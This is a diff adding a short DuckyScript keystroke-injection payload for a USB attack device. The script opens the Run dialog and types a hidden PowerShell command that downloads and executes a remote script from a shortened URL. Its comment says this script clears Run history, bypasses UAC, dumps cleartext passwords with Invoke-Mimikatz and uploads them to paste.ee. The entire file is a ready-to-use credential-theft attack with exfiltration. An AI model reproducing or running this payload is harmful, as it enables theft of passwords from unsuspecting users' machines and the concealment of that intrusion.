@@ -1,0 +1,7 @@
+REM Invoke a payload which clean the last Run-MRU command, bypass the uac, dump the clear text passwords using Invoke-Mimikatz PS Module and finally upload them to paste.ee
+REM Author: H3ll0World
+DELAY 1000
+GUI r
+DELAY 100
+STRING Powershell -W H Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ce8RKX'); Invoke-Payload HERE_YOUR_APIKEY_FROM_PASTE.EE
+ENTER
